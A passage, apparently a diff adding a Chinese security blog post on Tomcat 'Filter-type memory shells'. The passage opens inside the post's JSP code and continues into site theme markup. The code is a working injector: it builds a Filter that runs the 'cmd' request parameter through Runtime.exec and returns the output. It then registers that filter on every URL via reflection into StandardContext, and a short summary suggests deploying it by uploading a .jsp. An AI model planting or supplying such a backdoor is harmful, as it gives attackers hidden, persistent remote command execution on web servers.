#ABB2BF">, </span><span style="color: #98C379">&quot;/c&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)};</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">InputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmds).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">Scanner</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Scanner</span><span style="color: #ABB2BF">( in ).</span><span style="color: #61AFEF">useDelimiter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">a&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">output</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hasNext</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">servletResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(output);</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">servletResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">                }</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">filterChain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(servletRequest, servletResponse);</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> destroy</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        }</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">FilterDef</span><span style="color: #E06C75"> filterDef </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">FilterDef</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">filterDef</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilter</span><span style="color: #ABB2BF">(filter);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">filterDef</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterName</span><span style="color: #ABB2BF">(name);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">filterDef</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterClass</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">filter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFilterDef</span><span style="color: #ABB2BF">(filterDef);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">FilterMap</span><span style="color: #E06C75"> filterMap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">FilterMap</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">filterMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addURLPattern</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/*&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">filterMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterName</span><span style="color: #ABB2BF">(name);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">filterMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDispatcher</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">DispatcherType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">REQUEST</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">name</span><span style="color: #ABB2BF">());</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFilterMapBefore</span><span style="color: #ABB2BF">(filterMap);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Constructor</span><span style="color: #E06C75"> constructor </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ApplicationFilterConfig</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Context</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">FilterDef</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">constructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ApplicationFilterConfig</span><span style="color: #E06C75"> filterConfig </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (ApplicationFilterConfig) </span><span style="color: #E5C07B">constructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(standardContext,filterDef);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">filterConfigs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(name, filterConfig);</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Inject Success !&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">html</span><span style="color: #56B6C2">&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">head</span><span style="color: #56B6C2">&gt;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">title</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">filter</span><span style="color: #56B6C2">&lt;/</span><span style="color: #E06C75">title</span><span style="color: #56B6C2">&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;/</span><span style="color: #E06C75">head</span><span style="color: #56B6C2">&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">body</span><span style="color: #56B6C2">&gt;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Hello</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Filter</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;/</span><span style="color: #E06C75">body</span><span style="color: #56B6C2">&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;/</span><span style="color: #E06C75">html</span><span style="color: #56B6C2">&gt;</span></span></code></pre></div></div></figure>
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>Filter 型内存马主要就是获取到 <code>StandContext</code>，然后通过<strong>反射</strong>注入。表现形式为 <code>Filter</code>。具体的实施可以是上传 <code>.jsp</code> 文件</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Java/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内存马系列--Filter型</div>
+      <div>http://example.com/2026/04/12/内存马系列--Filter型/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Piggy Sprint</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Listener%E5%9E%8B/" title="内存马系列--Listener型">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内存马系列--Listener型</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/01/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/" title="内存马系列--内存马介绍">
+                        <span class="hidden-mobile">内存马系列--内存马介绍</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/custom/RunTime/RunTime.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/custom/LoadingBar/pace.min.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/custom/ReadingProgress/ReadingProgress.js"></script>
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/RandomBanner.js"></script>
+<script src="/js/Background.js"></script>
+<script src="/js/Sidebar.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: true,
+    highlightLang: true,
+    highlightHeightLimit: 360,
+    isHighlightShrink: false,
+    copy: {
+      success: 'Copy Success',
+      error: 'Copy Error',
+      noSupport: 'Browser Not Support',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
+</html>
